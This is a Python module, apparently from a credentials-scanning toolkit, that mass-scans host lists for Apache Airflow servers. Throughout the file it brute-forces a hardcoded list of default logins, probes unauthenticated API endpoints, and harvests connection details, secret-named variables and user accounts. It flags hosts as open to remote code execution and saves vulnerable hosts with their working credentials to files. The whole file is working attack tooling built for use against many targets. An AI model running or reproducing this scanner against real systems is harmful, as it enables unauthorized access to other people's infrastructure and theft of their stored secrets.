import re
import json
from pathlib import Path
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

import requests
from urllib3.exceptions import InsecureRequestWarning
from rich.console import Console
from rich.table import Table

from .base_scanner import BaseDefaultCredsScanner

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
console = Console()

DEFAULT_AIRFLOW_CREDENTIALS = [
    ("airflow", "airflow"),
    ("admin", "admin"),
    ("airflow", "admin"),
    ("admin", "airflow"),
    ("user", "user"),
    ("test", "test"),
    ("demo", "demo"),
    ("airflow", "password"),
    ("admin", "password"),
    ("airflow", "airflow123"),
    ("admin", "admin123"),
    ("airflow", "Airflow123"),
    ("admin", "Admin123"),
    ("airflow", "Airflow@123"),
    ("admin", "Admin@123"),
    ("root", "root"),
    ("root", "password"),
    ("admin", "password123"),
    ("airflow", ""),
    ("admin", ""),
]

AIRFLOW_PORTS = [8080, 443, 80, 8443, 8888, 8793, 5000, 8081, 9090, 30081]

UNAUTH_ENDPOINTS = [
    ("/api/v1/version", "version"),
    ("/api/v1/dags", "dags"),
    ("/api/v1/config", "config"),
    ("/api/v1/connections", "connections"),
    ("/api/v1/variables", "variables"),
    ("/api/v1/pools", "pools"),
    ("/api/v1/users", "users"),
    ("/api/v1/roles", "roles"),
    ("/api/v1/providers", "providers"),
    ("/api/v1/plugins", "plugins"),
    ("/api/v1/importErrors", "import_errors"),
    ("/health", "health"),
    ("/api/v1/datasets", "datasets"),
]

POST_LOGIN_ENDPOINTS = [
    ("/api/v1/connections", "connections"),
    ("/api/v1/variables", "variables"),
    ("/api/v1/users", "users"),
    ("/api/v1/dags", "dags"),
    ("/api/v1/config", "config"),
    ("/api/v1/pools", "pools"),
    ("/api/v1/roles", "roles"),
    ("/api/v1/providers", "providers"),
]


def _build_url(host, port, ssl=False):
    scheme = "https" if ssl or port in (443, 8443) else "http"
    if (scheme == "http" and port == 80) or (scheme == "https" and port == 443):
        return f"{scheme}://{host}"
    return f"{scheme}://{host}:{port}"


def _detect_airflow(base_url, timeout=8):
    for path in ["/login/", "/health", "/api/v1/version", "/admin/airflow/login", "/"]:
        try:
            r = requests.get(f"{base_url}{path}", timeout=timeout, verify=False, allow_redirects=True)
            body = r.text.lower()
            if any(k in body for k in ["airflow", "dag", "apache airflow"]) or any(k in r.headers.get("server", "").lower() for k in ["airflow", "gunicorn"]):
                return True, path
        except Exception:
            continue
    return False, None


def _extract_csrf(html):
    for pattern in [
        r'name="csrf_token"[^>]*value="([^"]+)"',
        r'value="([^"]+)"[^>]*name="csrf_token"',
        r'name="_csrf_token"[^>]*value="([^"]+)"',
        r"'csrfToken':\s*'([^']+)'",
    ]:
        m = re.search(pattern, html)
        if m:
            field = "_csrf_token" if "_csrf_token" in pattern else "csrf_token"
            return m.group(1), field
    return None, "csrf_token"


def _try_login(base_url, username, password, timeout=8):
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})

    for login_path in ["/login/", "/admin/airflow/login"]:
        try:
            login_url = f"{base_url}{login_path}"
            r = session.get(login_url, timeout=timeout, verify=False)
            if r.status_code == 404:
                continue

            csrf, field = _extract_csrf(r.text)
            data = {"username": username, "password": password}
            if csrf:
                data[field] = csrf

            r = session.post(login_url, data=data, headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "Referer": login_url,
            }, timeout=timeout, verify=False, allow_redirects=True)

            if "/login" not in r.url and r.status_code == 200:
                return session, True

            if r.status_code == 200 and "/login" in r.url:
                body = r.text.lower()
                if not any(e in body for e in ["incorrect", "invalid", "failed", "error"]):
                    if any(k in body for k in ["dag", "airflow", "task_instance"]):
                        return session, True
        except Exception:
            continue

    try:
        r = session.get(f"{base_url}/api/v1/dags", auth=(username, password),
                        timeout=timeout, verify=False)
        if r.status_code == 200 and "dags" in r.text.lower():
            session.auth = (username, password)
            return session, True
    except Exception:
        pass

    return None, False


def _check_unauth_access(base_url, timeout=8):
    findings = {}
    for endpoint, name in UNAUTH_ENDPOINTS:
        try:
            r = requests.get(f"{base_url}{endpoint}", timeout=timeout, verify=False,
                             headers={"Accept": "application/json"})
            if r.status_code == 200:
                try:
                    data = r.json()
                    findings[name] = {"status": r.status_code, "data": data}
                except Exception:
                    if len(r.text) > 10 and "login" not in r.text.lower():
                        findings[name] = {"status": r.status_code, "text": r.text[:500]}
        except Exception:
            continue
    return findings


def _enumerate_post_login(session, base_url, timeout=8):
    findings = {}
    auth = getattr(session, 'auth', None)
    for endpoint, name in POST_LOGIN_ENDPOINTS:
        try:
            kwargs = {"timeout": timeout, "verify": False, "headers": {"Accept": "application/json"}}
            if auth:
                kwargs["auth"] = auth
            r = session.get(f"{base_url}{endpoint}", **kwargs)
            if r.status_code == 200:
                try:
                    data = r.json()
                    findings[name] = data
                except Exception:
                    pass
        except Exception:
            continue
    return findings


def _extract_secrets(enum_data):
    secrets = []
    conns = enum_data.get("connections", {})
    for c in conns.get("connections", []):
        entry = {
            "type": "connection",
            "id": c.get("connection_id", ""),
            "conn_type": c.get("conn_type", ""),
            "host": c.get("host", ""),
            "port": c.get("port", ""),
            "login": c.get("login", ""),
            "schema": c.get("schema", ""),
        }
        if any(v for k, v in entry.items() if k not in ("type", "id") and v):
            secrets.append(entry)

    variables = enum_data.get("variables", {})
    for v in variables.get("variables", []):
        key = v.get("key", "")
        val = v.get("value", "")
        if any(s in key.lower() for s in ["secret", "password", "token", "key", "api", "credential", "auth"]):
            secrets.append({"type": "variable", "key": key, "value": val})

    users = enum_data.get("users", {})
    for u in users.get("users", []):
        secrets.append({
            "type": "user",
            "username": u.get("username", ""),
            "email": u.get("email", ""),
            "roles": [r.get("name", "") for r in u.get("roles", [])],
            "active": u.get("active", None),
        })

    return secrets


def scan_single_target(host, ports=None, timeout=8, credentials=None):
    if credentials is None:
        credentials = DEFAULT_AIRFLOW_CREDENTIALS
    if ports is None:
        ports = AIRFLOW_PORTS

    result = {
        "host": host,
        "status": "unknown",
        "airflow_detected": False,
        "port": None,
        "ssl": False,
        "base_url": None,
        "unauth_access": {},
        "valid_creds": [],
        "post_login_data": {},
        "secrets": [],
        "version": None,
        "dags_count": None,
        "rce_possible": False,
    }

    detected_url = None
    detected_port = None

    for port in ports:
        for ssl in [False, True] if port not in (443, 8443) else [True]:
            base_url = _build_url(host, port, ssl)
            found, path = _detect_airflow(base_url, timeout)
            if found:
                detected_url = base_url
                detected_port = port
                result["airflow_detected"] = True
                result["port"] = port
                result["ssl"] = ssl
                result["base_url"] = base_url
                break
        if detected_url:
            break

    if not detected_url:
        result["status"] = "not_airflow"
        return result

    unauth = _check_unauth_access(detected_url, timeout)
    result["unauth_access"] = {k: v for k, v in unauth.items()}

    if "version" in unauth:
        try:
            result["version"] = unauth["version"]["data"].get("version")
        except Exception:
            pass

    if "dags" in unauth:
        try:
            result["dags_count"] = unauth["dags"]["data"].get("total_entries")
        except Exception:
            pass

    if "config" in unauth or "connections" in unauth or "variables" in unauth:
        result["status"] = "critical_unauth"
        secrets = _extract_secrets({k: v.get("data", {}) for k, v in unauth.items()})
        result["secrets"].extend(secrets)

    for username, password in credentials:
        session, success = _try_login(detected_url, username, password, timeout)
        if success:
            result["valid_creds"].append({"username": username, "password": password})

            enum_data = _enumerate_post_login(session, detected_url, timeout)
            result["post_login_data"] = enum_data

            if not result["version"]:
                try:
                    kwargs = {"timeout": timeout, "verify": False}
                    if hasattr(session, 'auth') and session.auth:
                        kwargs["auth"] = session.auth
                    r = session.get(f"{detected_url}/api/v1/version", **kwargs)
                    if r.status_code == 200:
                        result["version"] = r.json().get("version")
                except Exception:
                    pass

            if not result["dags_count"] and "dags" in enum_data:
                result["dags_count"] = enum_data["dags"].get("total_entries")

            secrets = _extract_secrets(enum_data)
            for s in secrets:
                if s not in result["secrets"]:
                    result["secrets"].append(s)

            dags = enum_data.get("dags", {}).get("dags", [])
            for d in dags:
                dag_id = d.get("dag_id", "")
                if "bash" in dag_id.lower() or "example" in dag_id.lower():
                    result["rce_possible"] = True
                    break

            if not result["rce_possible"] and result["valid_creds"]:
                roles = []
                for u in enum_data.get("users", {}).get("users", []):
                    if u.get("username") == username:
                        roles = [r.get("name", "") for r in u.get("roles", [])]
                if "Admin" in roles or "Op" in roles:
                    result["rce_possible"] = True

            break

    if result["valid_creds"]:
        result["status"] = "critical_creds"
    elif result["unauth_access"]:
        result["status"] = "vulnerable_unauth"
    else:
        result["status"] = "login_required"

    return result


def scan_targets_from_file(filepath, ports=None, timeout=8, max_workers=20, credentials=None, output=None):
    lines = Path(filepath).read_text().strip().splitlines()
    targets = []
    for line in lines:
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        ip = line.split("\t")[0].split(" ")[0].strip()
        if ip:
            targets.append(ip)

    targets = list(dict.fromkeys(targets))
    console.print(f"[cyan]Loaded {len(targets)} unique targets from {filepath}[/cyan]")

    results = []
    vulnerable = []

    def _scan_one(host):
        try:
            return scan_single_target(host, ports=ports, timeout=timeout, credentials=credentials)
        except Exception as e:
            return {"host": host, "status": "error", "error": str(e)}

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(_scan_one, t): t for t in targets}
        for i, future in enumerate(futures):
            try:
                r = future.result(timeout=timeout * len(AIRFLOW_PORTS) * 3)
            except Exception as e:
                r = {"host": futures[future], "status": "timeout", "error": str(e)}

            results.append(r)
            host = r.get("host", "?")
            status = r.get("status", "?")

            if status == "critical_creds":
                creds = r.get("valid_creds", [])
                cred_str = ", ".join(f"{c['username']}:{c['password']}" for c in creds)
                console.print(f"  [bold red][CRIT][/bold red] {host}:{r.get('port','')} - Creds: {cred_str} | v{r.get('version','?')} | DAGs: {r.get('dags_count','?')} | RCE: {r.get('rce_possible')}")
                vulnerable.append(r)
            elif status == "critical_unauth":
                exposed = list(r.get("unauth_access", {}).keys())
                console.print(f"  [bold red][UNAUTH][/bold red] {host}:{r.get('port','')} - No auth needed! Exposed: {', '.join(exposed)}")
                vulnerable.append(r)
            elif status == "vulnerable_unauth":
                exposed = list(r.get("unauth_access", {}).keys())
                console.print(f"  [yellow][INFO][/yellow] {host}:{r.get('port','')} - Partial unauth: {', '.join(exposed)}")
            elif status == "login_required":
                console.print(f"  [dim][SAFE][/dim] {host}:{r.get('port','')} - Login required, no default creds")
            elif status == "not_airflow":
                console.print(f"  [dim][-][/dim] {host} - Not Airflow or unreachable")
            else:
                console.print(f"  [dim][?][/dim] {host} - {status}")

    _print_summary(results, vulnerable)

    if output is None:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        output = f"airflow_scan_{ts}.json"

    save_data = {
        "scan_time": datetime.now().isoformat(),
        "total_targets": len(targets),
        "airflow_found": sum(1 for r in results if r.get("airflow_detected")),
        "vulnerable": len(vulnerable),
        "results": results,
    }
    with open(output, "w") as f:
        json.dump(save_data, f, indent=2, default=str)
    console.print(f"\n[green]Results saved: {output}[/green]")

    vuln_ips_file = output.replace(".json", "_vulnerable.txt")
    with open(vuln_ips_file, "w") as f:
        for r in vulnerable:
            creds = r.get("valid_creds", [{}])
            cred_str = f"{creds[0].get('username','')}:{creds[0].get('password','')}" if creds else "noauth"
            f.write(f"{r['host']}:{r.get('port', 8080)}\t{cred_str}\tv{r.get('version', '?')}\n")
    if vulnerable:
        console.print(f"[green]Vulnerable targets: {vuln_ips_file}[/green]")

    return save_data


def _print_summary(results, vulnerable):
    console.print()
    table = Table(title="Airflow Mass Scan Summary", show_lines=True)
    table.add_column("Metric", style="cyan")
    table.add_column("Value", style="white")

    total = len(results)
    airflow_found = sum(1 for r in results if r.get("airflow_detected"))
    crit_creds = sum(1 for r in results if r.get("status") == "critical_creds")
    crit_unauth = sum(1 for r in results if r.get("status") == "critical_unauth")
    partial = sum(1 for r in results if r.get("status") == "vulnerable_unauth")
    safe = sum(1 for r in results if r.get("status") == "login_required")

    table.add_row("Total Targets", str(total))
    table.add_row("Airflow Detected", f"{airflow_found}")
    table.add_row("CRITICAL - Default Creds", f"[bold red]{crit_creds}[/bold red]" if crit_creds else "0")
    table.add_row("CRITICAL - No Auth", f"[bold red]{crit_unauth}[/bold red]" if crit_unauth else "0")
    table.add_row("INFO - Partial Unauth", f"[yellow]{partial}[/yellow]" if partial else "0")
    table.add_row("Safe - Login Required", str(safe))
    console.print(table)

    if vulnerable:
        console.print()
        vtable = Table(title="Vulnerable Targets Detail", show_lines=True)
        vtable.add_column("Host", style="red")
        vtable.add_column("Port", style="cyan")
        vtable.add_column("Status", style="yellow")
        vtable.add_column("Creds", style="green")
        vtable.add_column("Version", style="white")
        vtable.add_column("DAGs", style="white")
        vtable.add_column("RCE", style="red")
        vtable.add_column("Secrets", style="magenta")

        for r in vulnerable:
            creds = ", ".join(f"{c['username']}:{c['password']}" for c in r.get("valid_creds", []))
            if not creds:
                creds = "noauth"
            secrets_count = len(r.get("secrets", []))
            vtable.add_row(
                r.get("host", ""),
                str(r.get("port", "")),
                r.get("status", ""),
                creds,
                str(r.get("version", "?")),
                str(r.get("dags_count", "?")),
                "[bold red]YES[/bold red]" if r.get("rce_possible") else "no",
                f"{secrets_count} found" if secrets_count else "0",
            )
        console.print(vtable)

        conn_secrets = []
        for r in vulnerable:
            for s in r.get("secrets", []):
                if s.get("type") == "connection":
                    conn_secrets.append((r.get("host", ""), s))

        if conn_secrets:
            console.print()
            ctable = Table(title="Leaked Connections", show_lines=True)
            ctable.add_column("Source", style="red")
            ctable.add_column("Conn ID", style="cyan")
            ctable.add_column("Type", style="yellow")
            ctable.add_column("Host", style="white")
            ctable.add_column("Port", style="white")
            ctable.add_column("Login", style="green")
            ctable.add_column("Schema", style="white")

            for src, s in conn_secrets:
                ctable.add_row(src, s.get("id", ""), s.get("conn_type", ""),
                               s.get("host", ""), str(s.get("port", "")),
                               s.get("login", ""), s.get("schema", ""))
            console.print(ctable)


class AirflowScanner(BaseDefaultCredsScanner):
    def __init__(self, host, port=8080, credentials=None, max_workers=10,
                 timeout=5, verbose=True, use_ssl=False):
        self.use_ssl = use_ssl
        self.base_url = _build_url(host, port, use_ssl)
        super().__init__(host, port, credentials, max_workers, timeout, verbose)

    def get_default_credentials(self):
        return DEFAULT_AIRFLOW_CREDENTIALS

    def get_service_name(self):
        return "Apache Airflow"

    def test_connection(self, username, password):
        result = {
            "username": username, "password": password,
            "success": False, "service": "airflow",
            "host": self.host, "port": self.port,
        }
        session, success = _try_login(self.base_url, username, password, self.timeout)
        if success:
            result["success"] = True
            try:
                kwargs = {"timeout": self.timeout, "verify": False}
                if hasattr(session, 'auth') and session.auth:
                    kwargs["auth"] = session.auth
                r = session.get(f"{self.base_url}/api/v1/version", **kwargs)
                if r.status_code == 200:
                    result["info"] = f"Version: {r.json().get('version', '?')}"
            except Exception:
                pass
            try:
                kwargs = {"timeout": self.timeout, "verify": False}
                if hasattr(session, 'auth') and session.auth:
                    kwargs["auth"] = session.auth
                r = session.get(f"{self.base_url}/api/v1/dags", **kwargs)
                if r.status_code == 200:
                    result["info"] = result.get("info", "") + f", DAGs: {r.json().get('total_entries', '?')}"
            except Exception:
                pass
        else:
            result["error"] = "Invalid credentials"
        return result


def scan_airflow(host, port=8080, credentials=None, max_workers=10,
                 timeout=5, verbose=True, use_ssl=False, output_file=None):
    scanner = AirflowScanner(host=host, port=port, credentials=credentials,
                             max_workers=max_workers, timeout=timeout,
                             verbose=verbose, use_ssl=use_ssl)
    results = scanner.scan()
    scanner.print_summary()
    if output_file:
        scanner.save_results(output_file)
    return {
        "host": host, "port": port, "service": "airflow",
        "valid_credentials": scanner.get_valid_credentials(),
        "total_tested": len(scanner.credentials), "results": results,
    }
